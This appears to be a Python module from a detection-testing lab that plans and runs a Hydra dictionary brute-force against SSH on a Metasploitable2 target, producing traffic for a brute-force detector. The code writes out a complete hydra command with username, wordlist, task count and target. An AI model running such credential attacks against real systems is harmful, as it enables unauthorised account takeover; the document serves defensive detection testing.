"""Scenario 2 — SSH credential brute-force (Hydra, dictionary-based).

Generates the repeated-authentication traffic the Detection Pipeline's
SSH-brute-force detector is meant to flag. Uses a small, lab-confined wordlist
(see attack_range/wordlists/lab_ssh.txt) against the target's SSH service only.
This is run exclusively against the team's own Metasploitable2 target inside the
isolated lab.
"""

from __future__ import annotations

import os

from ._runner import run_planned, tool_available

NAME = "ssh_bruteforce"
TOOL = "hydra"


def plan(cfg: dict) -> dict:
    lab = cfg["lab"]
    sc = cfg["scenarios"]["ssh_bruteforce"]
    port = int(sc.get("port", 22))
    username = sc.get("username", "msfadmin")
    wordlist = sc.get("wordlist", "attack_range/wordlists/lab_ssh.txt")
    tasks = int(sc.get("hydra_tasks", 4))
    out_log = os.path.join(cfg["output"]["artifacts_dir"], "tool_logs", "hydra_ssh.txt")

    # -l <user> -P <wordlist>  : single known username, password list
    # -t <tasks>               : parallel tasks (kept low for a lab)
    # -o <log>                 : write results to a file
    command = [
        "hydra",
        "-l", str(username),
        "-P", wordlist,
        "-t", str(tasks),
        "-o", out_log,
        "-s", str(port),
        lab["target_ip"],
        "ssh",
    ]
    return {
        "scenario": NAME,
        "technique": "ssh_dictionary_attack",
        "tool": TOOL,
        "dst_ports": [port],
        "protocol": "tcp",
        "intent": f"Dictionary SSH login attempts as '{username}' against {lab['target_ip']}:{port}",
        "command": command,
        "extra": {"username": username, "wordlist": wordlist, "tasks": tasks},
    }


def run(cfg: dict, gt, dry_run: bool = False):
    os.makedirs(os.path.join(cfg["output"]["artifacts_dir"], "tool_logs"), exist_ok=True)
    sc = cfg["scenarios"]["ssh_bruteforce"]
    if not dry_run:
        if not tool_available("hydra"):
            raise FileNotFoundError("hydra not found on PATH (install on the Kali attacker VM)")
        wl = sc.get("wordlist", "attack_range/wordlists/lab_ssh.txt")
        if not os.path.exists(wl):
            raise FileNotFoundError(f"SSH wordlist not found: {wl}")
    timeout = float(sc.get("timeout_s", 300))
    return run_planned(plan(cfg), cfg, gt, dry_run=dry_run, timeout=timeout)
